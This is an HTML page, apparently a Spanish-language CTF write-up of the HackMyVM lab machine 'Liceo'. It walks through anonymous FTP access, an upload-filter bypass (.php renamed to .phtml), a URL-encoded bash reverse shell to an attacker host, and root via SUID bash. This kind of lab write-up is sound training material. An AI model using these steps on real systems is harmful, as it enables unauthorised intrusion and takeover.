<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iHarzz - Writeup Liceo | Penetration Testing</title>
    <link rel="stylesheet" href="../../css/style.css">
    <link rel="stylesheet" href="../../css/writeup.css">
</head>
<body>
    <!-- Navigation -->
    <nav>
        <div class="container">
            <a href="../../" class="logo">iHarzz</a>
            <ul>
                <li><a href="../../" class="nav-link">Home</a></li>
                <li><a href="../../blog/" class="nav-link">Blog</a></li>
                <li><a href="../../proyectos/" class="nav-link">Proyectos</a></li>
                <li><a href="../../retos/" class="nav-link">Retos</a></li>
            </ul>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero">
        <div class="hero-content">
            <h1 class="section-title">Writeup: Liceo</h1>
            <p class="subtitle">Explotación de vulnerabilidades AFU y Escalada SUID</p>
            <div class="hero-stats" style="display: flex; justify-content: center; gap: 2rem; margin-top: 2rem;">
                <div class="stat">
                    <span class="stat-number" style="font-size: 1.5rem; font-weight: bold; color: var(--primary);">Dificultad</span>
                    <span class="stat-label" style="display: block; color: #22c55e;">Fácil</span>
                </div>
                <div class="stat">
                    <span class="stat-number" style="font-size: 1.5rem; font-weight: bold; color: var(--primary);">Plataforma</span>
                    <span class="stat-label" style="display: block; color: var(--text-secondary);">HackMyVm</span>
                </div>
            </div>
        </div>
    </section>

    <main class="container">
        <article class="writeup-content">
            <section class="writeup-section">
                <h2>PRESENTACIÓN LICEO</h2>
                <p>Liceo es una máquina creada para todas aquellas personas que desean iniciarse en la ciberseguridad, especialmente en el mundo del pentesting.</p>
                <p>El objetivo principal es incentivar y dar visibilidad al pentesting mediante este reto. Ofrece un ejemplo de explotación de sistemas sencillo e intuitivo.</p>
                
                <div class="download-box">
                    <h3>¿DÓNDE SE PUEDE DESCARGAR?</h3>
                    <p>Disponible en la web de HackMyVm.</p>
                    <a href="https://mega.nz/file/ul1HhbCI#JwfYJMbUhHqycoubeOyvSXjhoXlvOqgkDQxjwWwJ9ag" target="_blank" class="cta-button" style="padding: 0.8rem 1.5rem; font-size: 0.9rem; min-width: auto;">Descargar Máquina</a>
                </div>
            </section>

            <section class="writeup-section">
                <h3>Requisitos</h3>
                <ul class="requirements-list">
                    <li>Sistema Operativo Kali Linux o similar.</li>
                    <li>Máquinas en la misma Red.</li>
                </ul>
            </section>

            <section class="writeup-section">
                <h3>Enumeración</h3>
                <p>Identificamos la IP de la máquina víctima para comenzar el escaneo de servicios.</p>
                <div class="info-badge">IP TARGET: <code>10.0.2.4</code></div>

                <p>Escaneo de puertos con Nmap:</p>
                <pre><code>❯ sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.0.2.4 -oG allPorts

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.52</code></pre>

                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>PUERTO</th>
                                <th>SERVICIO</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr><td>21</td><td>FTP</td></tr>
                            <tr><td>22</td><td>SSH</td></tr>
                            <tr><td>80</td><td>HTTP</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <section class="writeup-section">
                <h3>Intrusión</h3>
                <p>Acceso mediante usuario <strong>Anonymous</strong> en el servicio FTP:</p>
                <pre><code>❯ ftp 10.0.2.4
Name: Anonymous
Password: 
230 Login successful.</code></pre>

                <p>Localizamos un archivo <code>note.txt</code> con información relevante sobre una posible vulnerabilidad web.</p>
                <div class="note-box">
                    "Hi Matias, I have left on the web the continuations of today's work... we don't want intruders..."
                </div>

                <p>Realizamos fuzzing web para encontrar paneles de subida:</p>
                <pre><code>❯ gobuster dir -u http://10.0.2.4/ -w directory-list-2.3-medium.txt -x php,html

/uploads (Status: 301)
/upload.php (Status: 200)</code></pre>
            </section>

            <section class="writeup-section">
                <h3>Explotación: AFU -> RCE</h3>
                <p>Encontramos una vulnerabilidad de <strong>Arbitrary File Upload</strong>. Intentamos subir un archivo PHP malicioso para obtener ejecución remota de comandos.</p>
                
                <div class="image-wrapper">
                    <img src="images/image-20240211233940955.png" alt="Upload Interface">
                </div>

                <p>Bypass de extensión: Cambiamos <code>.php</code> por <code>.phtml</code> para evadir el filtro.</p>
                <pre><code>❯ mv vuln.php vuln.phtml</code></pre>

                <div class="image-wrapper">
                    <img src="images/image-20240212005056381.png" alt="Success Bypass">
                </div>

                <p>Ejecutamos una <strong>Reverse Shell</strong> codificada en URL para obtener acceso al sistema:</p>
                <pre><code>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.5%2F443%200%3E%261%22</code></pre>
                
                <div class="image-wrapper">
                    <img src="images/image-20240212020957901.png" alt="Access Granted">
                </div>
            </section>

            <section class="writeup-section">
                <h3>Escalada de Privilegios</h3>
                <p>Tratamiento de la TTY y búsqueda de binarios con permisos <strong>SUID</strong>:</p>
                <pre><code>www-data@liceoserver:/$ find / -perm -4000 2>/dev/null
...
/usr/bin/bash
...</code></pre>

                <p>Explotamos el binario de <code>bash</code> para convertirnos en root:</p>
                <pre><code>www-data@liceoserver:/# /bin/bash -p
whoami -> root</code></pre>

                <div class="image-wrapper">
                    <img src="images/image-20240212022710210.png" alt="Root Shell">
                </div>
            </section>

            <section class="writeup-section" style="border-top: 1px solid var(--border-color); padding-top: 2rem;">
                <div class="flags-container" style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                    <div class="flag-card" style="background: rgba(124, 58, 237, 0.1); padding: 1rem; border-radius: 10px; border: 1px solid var(--secondary);">
                        <h4 style="color: var(--secondary); margin-bottom: 0.5rem;">User Flag</h4>
                        <code style="color: var(--text-primary);">##########</code>
                    </div>
                    <div class="flag-card" style="background: rgba(0, 217, 255, 0.1); padding: 1rem; border-radius: 10px; border: 1px solid var(--primary);">
                        <h4 style="color: var(--primary); margin-bottom: 0.5rem;">Root Flag</h4>
                        <code style="color: var(--text-primary);">##########</code>
                    </div>
                </div>
            </section>
        </article>
    </main>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="social-links">
                <a href="https://github.com/DaviiddPR" target="_blank">GitHub</a>
                <a href="https://www.linkedin.com/in/david-poderoso-712407267/" target="_blank">LinkedIn</a>
            </div>
            <p class="footer-text">&copy; 2026 iHarzz - Penetration Testing & Cybersecurity. All rights reserved.</p>
        </div>
    </footer>

    <script src="../../js/script.js"></script>
</body>
</html>
